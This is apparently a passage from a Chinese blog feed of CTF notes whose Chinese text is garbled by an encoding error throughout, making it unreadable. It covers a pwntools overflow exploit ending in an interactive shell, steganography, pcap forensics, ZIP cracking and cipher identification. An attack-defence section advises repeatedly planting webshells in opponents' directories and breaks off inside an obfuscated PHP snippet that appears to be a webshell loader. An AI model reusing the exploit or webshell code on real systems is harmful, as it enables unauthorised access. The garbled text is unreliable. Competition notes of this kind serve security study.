class="hljs-number">136</span> + p64(<span class="hljs-number">0x00000000004005bd</span>)</span><span class="line"><span class="hljs-comment">##pwn.recvuntil(&#x27;Welcome&#x27;) #ä¸¤ç§ä¸åŒçš„recv</span></span><span class="line">pwn.sendline(payload)</span><span class="line">pwn.interactive()</span></code></pre></div></div><p>æœ¬åœ°è°ƒè¯•</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-dts codeBlockLines"><span class="line">socat tcp-listen:<span class="hljs-number">12345</span>,fork EXEC:./<span class="hljs-params">&lt;file_name&gt;</span></span><span class="line"></br></span><span class="line">gdb -&gt; attach <span class="hljs-params">&lt;pid&gt;</span> <span class="hljs-meta"># é€šè¿‡é™„åŠ æ¥å¾—åˆ°å‡†ç¡®çš„è°ƒè¯•</span></span></code></pre></div></div><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="éšå†™æœ¯"><a href="#éšå†™æœ¯" class="headerlink" title="éšå†™æœ¯"></a>éšå†™æœ¯</h3><h4 id="å›¾ç‰‡çš„éšå†™æœ¯"><a href="#å›¾ç‰‡çš„éšå†™æœ¯" class="headerlink" title="å›¾ç‰‡çš„éšå†™æœ¯"></a>å›¾ç‰‡çš„éšå†™æœ¯</h4><p>ä¸€èˆ¬ä½¿ç”¨<code>Stegsolve</code>è¿™ä¸ªå·¥å…·ã€‚</p><p>è¿™ä¸ªå·¥å…·åŒ…å«ï¼š</p><ul><li>å¯ä»¥é”®ç›˜å·¦å³æ¥æµ‹è¯•ä¸åŒçš„è‰²å½©é€šé“</li><li>å’Œå…¶ä»–å›¾ç‰‡è¿›è¡Œxorï¼Œsubç­‰æ“ä½œ</li><li>å¯¹<code>gif</code>æ ¼å¼çš„åŠ¨å›¾å¯ä»¥ä¸€å¸§ä¸€å¸§çš„çœ‹</li></ul><h5 id="LSB-æœ€ä½æœ‰æ•ˆä½-Least-Significant-Bit"><a href="#LSB-æœ€ä½æœ‰æ•ˆä½-Least-Significant-Bit" class="headerlink" title="LSB æœ€ä½æœ‰æ•ˆä½ (Least Significant Bit)"></a>LSB æœ€ä½æœ‰æ•ˆä½ (Least Significant Bit)</h5><p>è¿™ä¸ªçš„åŸç†æ˜¯åˆ©ç”¨RGBåä¸¤ä½çš„å·®åˆ«äººçœ¼çœ‹ä¸å‡ºæ¥çš„åˆ©ç”¨ã€‚å°†ä¿¡æ¯å†™åœ¨RGBçš„å2bitã€‚</p><p>ï¼ˆè€Œè¦ä½¿ç”¨è¿™æ ·çš„éšå†™æœ¯ï¼Œ<code>jpg</code>æ ¼å¼å°±ä¸è¡Œï¼Œå› ä¸º<code>jpg</code>æ ¼å¼çš„ä¼šæœ‰æŸå‹ç¼©ã€‚ï¼‰</p><p>è§£é¢˜ç”¨åˆ°<code>Stegsolve</code>è¿™ä¸ªå·¥å…·ã€‚</p><p><a href="https://segmentfault.com/a/1190000016223897">è¿™é‡Œ</a>æ˜¯å‚è€ƒæ–‡ç« </p><h5 id="å›¾ç‰‡çš„å åŠ "><a href="#å›¾ç‰‡çš„å åŠ " class="headerlink" title="å›¾ç‰‡çš„å åŠ "></a>å›¾ç‰‡çš„å åŠ </h5><p>é€šå¸¸é¦–å…ˆæ£€æŸ¥è¿™ä¸ªå›¾ç‰‡æ˜¯å¦æœ‰å…¶ä»–æ–‡ä»¶å åŠ èµ·æ¥ï¼Œä¸ºä»€ä¹ˆå¯ä»¥å åŠ ï¼ŒåŸå› åœ¨äºPNGçš„ç»“æŸç¬¦ä¸º<code>FF D9</code>ã€‚ç»“æŸç¬¦åé¢çš„å†…å®¹ä¸åšæ˜¾ç¤ºã€‚</p><p>æŸ¥çœ‹å¹¶ä¸”æå–æ–‡ä»¶çš„æ–¹æ³•ï¼š</p><ul><li><code>binwalk -e &lt;file&gt;</code> -e æ˜¯æå–æ–‡ä»¶ã€‚</li><li><code>foremost &lt;file&gt;</code>  æå–æ–‡ä»¶</li><li><code>dd if=è¦åˆ†ç¦»çš„å›¾ç‰‡å.jpg of=åˆ†ç¦»å‡ºæ¥çš„å›¾ç‰‡å.jpg skip=åç§»é‡ bs=1</code> æ‰‹åŠ¨åˆ†ç¦»</li></ul><h4 id="éŸ³é¢‘çš„éšå†™æœ¯"><a href="#éŸ³é¢‘çš„éšå†™æœ¯" class="headerlink" title="éŸ³é¢‘çš„éšå†™æœ¯"></a>éŸ³é¢‘çš„éšå†™æœ¯</h4><ul><li><a href="https://blog.csdn.net/pdsu161530247/article/details/77568807">å‚è€ƒ</a>è¿™ç¯‡æ€»ç»“</li></ul><p>ä¸€èˆ¬ä½¿ç”¨<code>Audacity</code>å·¥å…·</p><h5 id="è«æ–¯å¯†ç "><a href="#è«æ–¯å¯†ç " class="headerlink" title="è«æ–¯å¯†ç "></a>è«æ–¯å¯†ç </h5><p>æœ‰æ•²æ‰“å£°ï¼Œ æ”¾å¤§æ³¢å½¢å›¾</p><h5 id="é¢‘è°±å›¾"><a href="#é¢‘è°±å›¾" class="headerlink" title="é¢‘è°±å›¾"></a>é¢‘è°±å›¾</h5><p>æœ‰çš„ä¼šé€šè¿‡åœ¨é¢‘è°±ä¸­å†™å…¥flagçš„æ–¹å¼æ¥éšè—</p><p>è§£å¯†çš„æ–¹æ³•æ˜¯åœ¨Audacityç‚¹å‡»<code>è½¨é“åç§° -&gt; é¢‘è°±å›¾</code></p><h4 id="ç½‘ç»œåŒ…çš„éšå†™æœ¯"><a href="#ç½‘ç»œåŒ…çš„éšå†™æœ¯" class="headerlink" title="ç½‘ç»œåŒ…çš„éšå†™æœ¯"></a>ç½‘ç»œåŒ…çš„éšå†™æœ¯</h4><h5 id="éšè—åœ¨tcpæµä¸­çš„æ–‡ä»¶æå–æ–¹æ³•"><a href="#éšè—åœ¨tcpæµä¸­çš„æ–‡ä»¶æå–æ–¹æ³•" class="headerlink" title="éšè—åœ¨tcpæµä¸­çš„æ–‡ä»¶æå–æ–¹æ³•"></a>éšè—åœ¨tcpæµä¸­çš„æ–‡ä»¶æå–æ–¹æ³•</h5><ol><li>é€šè¿‡<code>æ–‡ä»¶ -&gt; å¯¼å‡ºå¯¹è±¡ -&gt; HTTP</code>é€‰æ‹©éœ€è¦å¯¼å‡ºçš„æ–‡ä»¶</li></ol><p>æˆ–è€…</p><ul><li>æ‰¾åˆ°tcpæµï¼Œç„¶åä¿å­˜ä¸º<code>C Array</code>æ ¼å¼çš„æ–‡ä»¶ï¼Œç®€å•çš„ä¿®æ”¹æ•°ç»„ä¸º<code>python</code>æ ¼å¼çš„æ•°ç»„åï¼Œå†™æ®µè„šæœ¬ä¿å­˜åˆ°äºŒè¿›åˆ¶æ–‡ä»¶</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:</span><span class="line">a = <span class="hljs-built_in">bytearray</span>(array_code)</span><span class="line">file.write(a)</span></code></pre></div></div><ol start="2"><li>ä½¿ç”¨<code>foremost</code>å·¥å…·</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-applescript codeBlockLines"><span class="line">foremost -v -i <span class="hljs-built_in">file</span>.pcap</span></code></pre></div></div><h5 id="é€šè¿‡æŠ¥æ–‡çš„é•¿åº¦ä¼ é€’ä¿¡æ¯"><a href="#é€šè¿‡æŠ¥æ–‡çš„é•¿åº¦ä¼ é€’ä¿¡æ¯" class="headerlink" title="é€šè¿‡æŠ¥æ–‡çš„é•¿åº¦ä¼ é€’ä¿¡æ¯"></a>é€šè¿‡æŠ¥æ–‡çš„é•¿åº¦ä¼ é€’ä¿¡æ¯</h5><p>å¸¸è§çš„æ˜¯<code>ping</code>å¯ä»¥éšæ„çš„æ§åˆ¶æŠ¥æ–‡çš„é•¿åº¦ï¼Œé€šè¿‡æ—¶é—´é¡ºåºæ’åˆ—å‡º<code>ping</code>æŠ¥æ–‡ï¼Œç„¶åå¾—å‡ºé•¿åº¦ï¼Œä½†æ˜¯è¿™ä¸ªé•¿åº¦ä¸€èˆ¬æ˜¯æœ‰åç§»çš„ï¼Œæ‰€ä»¥å†™ä¸€ä¸ªéå†<code>range(-50, 50)</code>è¿™æ ·çš„åç¦»å°±å¯ä»¥æ‰¾åˆ°<code>flag</code>äº†</p><h5 id="capæ–‡ä»¶è½½å…¥å‡ºé”™"><a href="#capæ–‡ä»¶è½½å…¥å‡ºé”™" class="headerlink" title="capæ–‡ä»¶è½½å…¥å‡ºé”™"></a>capæ–‡ä»¶è½½å…¥å‡ºé”™</h5><p>æœ‰æ—¶å€™ä¼šæœ‰<code>cap</code>æ–‡ä»¶è½½å…¥å‡ºé”™ï¼Œæ­¤æ—¶éœ€è¦ä¿®å¤ä¸º<code>pcap</code>æ–‡ä»¶ï¼Œ åœ¨<a href="http://f00l.de/hacking/pcapfix.php">è¿™ä¸ª</a>ç½‘ç«™ä¿®å¤</p><h5 id="å°†flagæ”¾åœ¨IPå¤´éƒ¨ä¸­"><a href="#å°†flagæ”¾åœ¨IPå¤´éƒ¨ä¸­" class="headerlink" title="å°†flagæ”¾åœ¨IPå¤´éƒ¨ä¸­"></a>å°†flagæ”¾åœ¨IPå¤´éƒ¨ä¸­</h5><p>ä¸€èˆ¬ä¼šæœ‰ä¸€åºåˆ—èƒ½è®©ä½ æ‰¾åˆ°çš„<code>flag</code>å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°åè¿™äº›TCPä¸­çš„IPå¤´éƒ¨ä¸­å¯èƒ½å°±ä¼šéšè—ç€çœŸæ­£çš„<code>flag</code></p><p>è¦å¦‚ä½•æ‰¾ï¼Œflagä¼šè¢«æ‹†åˆ†æ”¾åˆ°å„ä¸ªTCPä¸­ï¼Œè€Œä¸”å¯èƒ½æ˜¯é¢ å€’çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦è€ƒçœ¼åŠ›ï¼Œå¤šç§æƒ…å†µçš„flagæ ·å¼è¦æ•æ„Ÿ</p><h5 id="SSLåŠ å¯†æŠ¥æ–‡"><a href="#SSLåŠ å¯†æŠ¥æ–‡" class="headerlink" title="SSLåŠ å¯†æŠ¥æ–‡"></a>SSLåŠ å¯†æŠ¥æ–‡</h5><p>æƒ³è¦è§£å¯†SSLçš„åŠ å¯†æŠ¥æ–‡ï¼Œéœ€è¦æœ‰<code>key.log</code>ï¼Œè¿™ä¸ªkeyçš„æ ¼å¼å¦‚ä¸‹ï¼š</p><p><code>CLIENT_RANDOM a3cd2cd8add1529ff7c65dc2fdc99504ca00b38f79bad693372ddc1d23cf6e50 4cc397a91832195287d8614db7e5c9175395a7063eefed8d3b2b06c04a8213345fcdd233e4b82a8695dd17c32bfaeeb9</code></p><p><a href="http://scz.617.cn/network/201512241045.txt">è¿™é‡Œ</a>æ˜¯å¦‚ä½•ä½¿ç”¨wiresharkè§£å¯†SSLçš„æ–‡ç« ã€‚</p><p>ç®€å•æ¥è®²æ˜¯æ‰¾åˆ°<code>key.log</code>å<br><code>Wireshark-&gt;Edit-&gt;Preferences-&gt;Protocols-&gt;SSL-&gt;(Pre)-Master-Secret log filename-&gt;&lt;path&gt;\sslkey.log</code></p><hr><h3 id="æ–‡ä»¶å¤´éƒ¨ç ´å"><a href="#æ–‡ä»¶å¤´éƒ¨ç ´å" class="headerlink" title="æ–‡ä»¶å¤´éƒ¨ç ´å"></a>æ–‡ä»¶å¤´éƒ¨ç ´å</h3><ul><li><a href="https://app.yinxiang.com/Home.action#n=2682fd10-8a40-4331-bd62-4502765a8f0a&s=s3&ses=4&sh=2&sds=5&">è¿™é‡Œ</a>æ˜¯å„ç§å¤´éƒ¨çš„ç‰¹å¾ç </li></ul><h4 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h4><p>GIFå­—æ®µ+ç‰ˆæœ¬å·ï¼Œé€šå¸¸æ˜¯ï¼š</p><p><code>GIF89a</code> æˆ–è€…<code>GIF87a</code></p><h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><p>é€šå¸¸æ˜¯<br><code>89 50 4E 47  0D 0A 1A 0A   00 00 00 00  49 48 44 52  .PNG........IHDR</code></p><h3 id="æ–‡æœ¬è½¬åˆ°äºŒè¿›åˆ¶æ–‡ä»¶"><a href="#æ–‡æœ¬è½¬åˆ°äºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="æ–‡æœ¬è½¬åˆ°äºŒè¿›åˆ¶æ–‡ä»¶"></a>æ–‡æœ¬è½¬åˆ°äºŒè¿›åˆ¶æ–‡ä»¶</h3><ul><li>å½“ç»™å‡ºçš„æ˜¯ <code>00000000: 4c5a 4950 01b3 007f b61b edf0 8440 58e3  LZIP.........@X.</code>è¿™æ ·çš„æ–‡ä»¶æ—¶ï¼Œå¯ä»¥é€šè¿‡<code>xxd</code>ç›´æ¥è½¬æ¢æˆäºŒè¿›åˆ¶æ–‡ä»¶</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stata codeBlockLines"><span class="line"><span class="hljs-keyword">cat</span> <span class="hljs-keyword">file</span>.txt | xxd -r &gt; <span class="hljs-keyword">file</span>.bin</span></code></pre></div></div><ul><li>å½“ç»™å‡ºçš„æ˜¯<code>4c5a 4950 01b3 007f b61b edf0 8440 58e3</code>è¿™æ ·çš„ï¼Œæˆ–è€…æ˜¯wiresharkç»™çš„<code>C Array</code>ç±»å‹çš„æ•°ç»„æ ¼å¼</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./file.txt&#x27;</span>)</span><span class="line"></br></span><span class="line">tmp = []</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> line.strip().split(<span class="hljs-string">&#x27; &#x27;</span>):</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i) == <span class="hljs-number">4</span>:</span><span class="line">            tmp.append(<span class="hljs-built_in">int</span>(i[:<span class="hljs-number">2</span>], <span class="hljs-number">16</span>))</span><span class="line">            tmp.append(<span class="hljs-built_in">int</span>(i[<span class="hljs-number">2</span>:], <span class="hljs-number">16</span>))</span><span class="line">        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i) == <span class="hljs-number">2</span>:</span><span class="line">            tmp.append(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">16</span>))</span><span class="line"></br></span><span class="line">out = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./file.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)</span><span class="line">out.write(<span class="hljs-built_in">bytearray</span>(tmp)) <span class="hljs-comment"># bytearray()æ˜¯å…³é”®æ–¹æ³•</span></span></code></pre></div></div><h3 id="å…³äº-ZIP-çš„é¢˜ç›®"><a href="#å…³äº-ZIP-çš„é¢˜ç›®" class="headerlink" title="å…³äº ZIP çš„é¢˜ç›®"></a>å…³äº ZIP çš„é¢˜ç›®</h3><ul><li><a href="https://introspelliam.github.io/2017/11/12/misc/CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E5%85%B3%E4%BA%8Ezip%E7%9A%84%E6%80%BB%E7%BB%93/">è¿™é‡Œ</a>æ˜¯å…³äºZIPç ´è§£çš„æ€»ç»“</li></ul><h4 id="çˆ†ç ´è½¯ä»¶"><a href="#çˆ†ç ´è½¯ä»¶" class="headerlink" title="çˆ†ç ´è½¯ä»¶"></a>çˆ†ç ´è½¯ä»¶</h4><p><code>ZipPasswordTool.exe</code></p><p><code>HAP_Advanced Archive Password Recovery 4.53.exe</code></p><h4 id="ä¼ªå¯†ç "><a href="#ä¼ªå¯†ç " class="headerlink" title="ä¼ªå¯†ç "></a>ä¼ªå¯†ç </h4><p>æ–¹æ³•æ˜¯å®šä½åˆ°<code>50 4B 01 02</code>ï¼Œç„¶åå‘åæ‰¾åˆ°<code>09 00</code> ä¿®æ”¹ä¸º<code>00 00</code><br>å¦‚æœæ˜¯ä¼ªåŠ å¯†ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è§£å‹äº†ã€‚<code>unzip</code></p><p>åœ¨<code>010Editor</code>ä¸­å¯ä»¥çœ‹åˆ°ï¼Œä¼ªå¯†ç æ‰€åœ¨çš„åœ°æ–¹æ˜¯<code>ZIPDIRENTRY -&gt; deFlags</code><br>å¥‡æ•°åŠ å¯†ï¼Œå¶æ•°ä¸åŠ å¯†ã€‚</p><h4 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h4><p>å¤šçº¿ç¨‹ä½¿ç”¨  <code>ZipPasswordTool.exe</code></p><p>å½“éœ€è¦ç”¨åˆ°æ©ç çš„æ—¶å€™ï¼Œä½¿ç”¨<code>AdvancedArchivePasswordRecovery.exe</code></p><h4 id="æ˜æ–‡æ”»å‡»"><a href="#æ˜æ–‡æ”»å‡»" class="headerlink" title="æ˜æ–‡æ”»å‡»"></a>æ˜æ–‡æ”»å‡»</h4><p>å½“èƒ½å¤Ÿå–å¾—åŠ å¯†æ–‡ä»¶ä¸­å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ˜æ–‡æ”»å‡»ã€‚<br>åŸç†æ˜¯é€šè¿‡è®¡ç®—<code>crc</code>çš„å€¼è€Œç›´æ¥å¾—åˆ°åŠ å¯†ç§˜é’¥ã€‚</p><h3 id="LZIP-æ–‡ä»¶"><a href="#LZIP-æ–‡ä»¶" class="headerlink" title="LZIP æ–‡ä»¶"></a>LZIP æ–‡ä»¶</h3><p><code>lzip</code>æ–‡ä»¶æ˜¯å•æ–‡ä»¶å‹ç¼©ï¼Œé€šè¿‡å·¥å…·<code>lzip -d</code>è§£å‹</p><h3 id="python-åç¼–è¯‘"><a href="#python-åç¼–è¯‘" class="headerlink" title="python åç¼–è¯‘"></a>python åç¼–è¯‘</h3><ul><li>ä½¿ç”¨<code>uncompyle2</code>åç¼–è¯‘</li></ul><p><a href="%60https://github.com/wibiti/uncompyle2.git%60">Githubé¡¹ç›®åœ°å€</a></p><ul><li>ä½¿ç”¨<a href="http://tools.bugscaner.com/decompyle/">è¿™ä¸ª</a>ç½‘ç«™åç¼–è¯‘</li></ul><h2 id="åŠ è§£å¯†"><a href="#åŠ è§£å¯†" class="headerlink" title="åŠ è§£å¯†"></a>åŠ è§£å¯†</h2><h3 id="åœ¨çº¿å·¥å…·é›†"><a href="#åœ¨çº¿å·¥å…·é›†" class="headerlink" title="åœ¨çº¿å·¥å…·é›†"></a>åœ¨çº¿å·¥å…·é›†</h3><ul><li><a href="http://ctf.ssleye.com/">CTF åœ¨çº¿å·¥å…·</a><ul><li>rot13 ä¸åŒºåˆ†å¤§å°å†™ï¼Œæœ‰é—®é¢˜</li></ul></li><li><a href="https://tool.bugku.com/?wafcloud=1">CTFåœ¨çº¿å·¥å…·2</a></li><li><a href="https://blog.csdn.net/qq_38780085/article/details/79305488">æ•´åˆçš„å·¥å…·ç½‘ç«™</a></li><li><a href="http://tool.chinaz.com/tools/base64.aspx">ç«™é•¿å·¥å…·</a></li><li><a href="https://www.bugku.com/mima/">ç¤¾å·¥å­—å…¸åœ¨çº¿ç”Ÿæˆ</a><ul><li><a href="https://www.freebuf.com/sectool/144740.html">è¿™æ˜¯</a><code>cupp</code>å­—å…¸ç”Ÿæˆ å’Œ<code>cewl</code>ç½‘ç«™å…³é”®å­—æ”¶é›†çš„å·¥å…·ä»‹ç»</li><li><a href="https://github.com/Saferman/cupper">è¿™æ˜¯</a>ä¸­æ–‡ç¤¾å·¥å­—å…¸ç”Ÿæˆå™¨ï¼Œ<code>/root/lib/gitbug_object/cupper</code></li></ul></li></ul><hr><ul><li><a href="https://www.cmd5.com/">md5</a></li><li><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">æ …æ å¯†ç </a></li><li><a href="http://www.mxcz.net/tools/rot13.aspx">rot13</a></li><li><a href="http://www.ofmonkey.com/encode/unicode">unicode</a></li><li><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">æ‘©æ–¯å¯†ç </a></li><li><a href="http://ctf.ssleye.com/base64.html">Base</a></li><li><a href="http://web.chacuo.net/charsetxxencode">xxencode</a></li><li><a href="http://www.nicetool.net/app/binary_convert.html">äºŒè¿›åˆ¶</a></li><li><a href="https://www.bugku.com/tools/jsfuck/">JsFuck</a></li><li><a href="https://www.toolnb.com/tools/phpserialize.html">phpåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</a></li></ul><hr><ul><li><a href="http://byd.dropsec.xyz/2016/05/25/CTF%E4%B9%8B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%80%BB%E7%BB%93/">è¿™é‡Œ</a>ä»‹ç»äº†CTFå¸¸ç”¨çš„åŠ å¯†æŠ€æœ¯</li><li><a href="https://app.yinxiang.com/shard/s3/nl/1049412/2d6c5e63-14ef-49d9-bb17-00b41e76756d?title=CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86">è¿™é‡Œ</a>æ˜¯ä¸€ä»½<strong>å®Œæ•´çš„</strong>å¯†ç å­¦æ±‡æ€»</li><li><a href="https://blog.csdn.net/qq_40836553/article/details/79383488">è¿™é‡Œ</a>ä¹Ÿæ˜¯æ€»ç»“ï¼Œæœ‰è¡¨</li></ul><h3 id="Quoted-printableç¼–ç "><a href="#Quoted-printableç¼–ç " class="headerlink" title="Quoted-printableç¼–ç "></a>Quoted-printableç¼–ç </h3><p>å¯æ‰“å°ç¼–ç <br><em>ç‰¹ç‚¹</em> æ˜¯æœ‰3ä¸ªä¸ºä¸€ç»„ï¼Œæ¯ç»„å¼€å¤´éƒ½æ˜¯<code>=</code></p><p>e.g: <code>=B9=A4=D7=F7=BC=F2=B1=A8</code></p><p>ç”¨å¤„æ˜¯å¯ä»¥ç”¨åœ¨é8bitçš„ä¼ è¾“é€šé“ä¸Š</p><h3 id="XXencode"><a href="#XXencode" class="headerlink" title="XXencode"></a>XXencode</h3><p><em>ç‰¹ç‚¹</em> æ˜¯æœ«å°¾æœ‰<code>+</code>æˆ–è€…<code>-</code></p><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p><em>ç‰¹ç‚¹</em> æ˜¯<code>æ•°å­—+å­—æ¯</code>ï¼Œå¹¶ä¸”è¦ä¹ˆæ˜¯32ä½ï¼Œè¦ä¹ˆæ˜¯64ä½</p><h3 id="äºŒè¿›åˆ¶"><a href="#äºŒè¿›åˆ¶" class="headerlink" title="äºŒè¿›åˆ¶"></a>äºŒè¿›åˆ¶</h3><p><em>ç‰¹ç‚¹</em> 8bitä¸€ç»„çš„<code>0</code> <code>1</code></p><h3 id="JsFuck"><a href="#JsFuck" class="headerlink" title="JsFuck"></a>JsFuck</h3><p><em>ç‰¹ç‚¹</em> å…¨æ˜¯<code>[</code> <code>]</code> <code>!</code></p><h3 id="bubblepy"><a href="#bubblepy" class="headerlink" title="bubblepy"></a>bubblepy</h3><p><em>ç‰¹ç‚¹</em> å·²å­—æ¯5ä¸ªä¸ºä¸€ç»„ï¼Œç”¨<code>-</code>è¿æ¥</p><p>å¦‚ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">xinik-samak-luvag-hutaf-fysil-notok-mepek-vanyh-zipef-hilok-detok-damif-cusol-fezyx</span></span></code></pre></div></div><p>è§£å¯†æ–¹æ³•æ˜¯ä½¿ç”¨pythonçš„åº“</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">pip install bubblepy</span><span class="line"></br></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> bubblepy <span class="hljs-keyword">import</span> BubbleBabble</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;xinik-samak-luvag-hutaf-fysil-notok-mepek-vanyh-zipef-hilok-detok-damif-cusol-fezyx&#x27;</span></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>BubbleBabble().decode(<span class="hljs-built_in">str</span>)</span><span class="line"><span class="hljs-string">&#x27;flag&#123;Ev3ry7hing_i5_bubb13s&#125;&#x27;</span></span></code></pre></div></div><h3 id="PDF417"><a href="#PDF417" class="headerlink" title="PDF417"></a>PDF417</h3><p>äºŒç»´æ¡å½¢ç ï¼Œæ¯”æ™®é€šæ¡å½¢ç èƒ½è®°å½•æ›´å¤šçš„ä¸œè¥¿ï¼Œå¹¶ä¸”ä¸éœ€è¦æ•°æ®åº“ã€‚</p><p><a href="https://online-barcode-reader.inliteresearch.com/">åœ¨çº¿æ¡ç è¯»å–å™¨</a>ï¼Œç¿»å¢™ã€‚æ¯”æ‰‹æœºè¦å‡†ç¡®ï¼Œæ”¯æŒå¤šç§æ ¼å¼ã€‚</p><h3 id="å·®åˆ†æ›¼å½»æ–¯ç‰¹ç¼–ç "><a href="#å·®åˆ†æ›¼å½»æ–¯ç‰¹ç¼–ç " class="headerlink" title="å·®åˆ†æ›¼å½»æ–¯ç‰¹ç¼–ç "></a>å·®åˆ†æ›¼å½»æ–¯ç‰¹ç¼–ç </h3><p>å¸¸ç”¨äºå±€åŸŸç½‘çš„ä¼ è¾“</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>çº¢è“å¯¹æŠ—å¸¸è§„æ“ä½œ</title>
      <link href="/2021/12/31/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C/"/>
      <url>/2021/12/31/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼€å±€æ€è·¯"><a href="#å¼€å±€æ€è·¯" class="headerlink" title="å¼€å±€æ€è·¯"></a>å¼€å±€æ€è·¯</h2><ol><li>ä¿®æ”¹å¯†ç </li><li>å…³é—­ç«¯å£</li><li>ç¡®ä¿ä¸è¦è®©æœºå™¨ä¸‹çº¿</li><li>å°†ç½‘ç«™çš„æºç å¤‡ä»½ï¼Œå¹¶å°†æºç æ”¾å…¥è™šæ‹Ÿæœºè¿›è¡Œä»£ç å®¡è®¡å’Œæœ¨é©¬æŸ¥æ€ï¼Œç”¨<code>#</code>æ³¨é‡Šæ‰</li><li>æœç´¢é«˜å±å‡½æ•°ï¼Œå¹¶å°†å½“å‰é«˜å±å‡½æ•°ä¿®å¤ä¸ºæ­£å¸¸æ²¡æœ‰æ¼æ´çš„å‡½æ•°ï¼Œæˆ–è€…ç”¨PHPå†™ä¸€ä¸ªç®€å•çš„WAFï¼Œç”¨<code>include</code>åŒ…å«ä¸Šå»</li><li>å¿«é€Ÿæ‰«æåˆ«äººçš„webshell</li><li>å®æ—¶ç›‘æ§å½“å‰webè®¿é—®æ—¥å¿—ï¼ŒåŠæ—¶å®¡æŸ¥ã€‚</li><li>å‘ç°åˆ«äººè¿›å…¥åè¿…é€Ÿä¿®å¤æ¼æ´</li><li>å¦‚æœè¿›å…¥åˆ«äººçš„ç›®å½•ï¼Œé‚£ä¹ˆå°±å¾ªç¯ç”Ÿæˆwebshellã€‚</li><li>æŠ“åˆ°å…¶ä»–äººçš„è¯­å¥ï¼Œé‚£ä¹ˆå°±å­¦ä¹ å¹¶æ‰“å›å»</li><li>ä½¿ç”¨<code>tcpdump</code>ç›‘æ§æµé‡</li><li><code>SEAY</code>ä»£ç å®¡è®¡å·¥å…·ï¼Œ <code>Dç›¾</code>éƒ¨ç½²åœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šå¿«é€ŸæŸ¥æ€</li><li>å¤‡ä»½ç½‘ç«™ç›®å½•ï¼Œä¸”ä¸è¦å°†ç½‘ç«™å¤‡ä»½æ”¾åœ¨ROOTä¸Š</li><li>æ”»å‡»äººå‘˜2äººï¼Œé˜²å®ˆäººå‘˜1äºº</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php codeBlockLines"><span class="line"><span class="hljs-meta">&lt;?php</span></span><span class="line"><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot; a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><span class="line"><span class="hljs-variable">$a</span>=str_rot13(<span class="hljs-variable">$a</span>);</span><span class="line"><span class="hljs-variable">$a</span>=strrev(<span class="hljs-variable">$a</span>);</span><span class="line"><span class="hljs-variable">$a</span>=base64_decode(<span class="hljs-variable">$a</span>);</span><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode233</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span></span><span class="line"></br>&#123;</span><span class="line">    <span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;&quot;</span>;</span><span class="line">    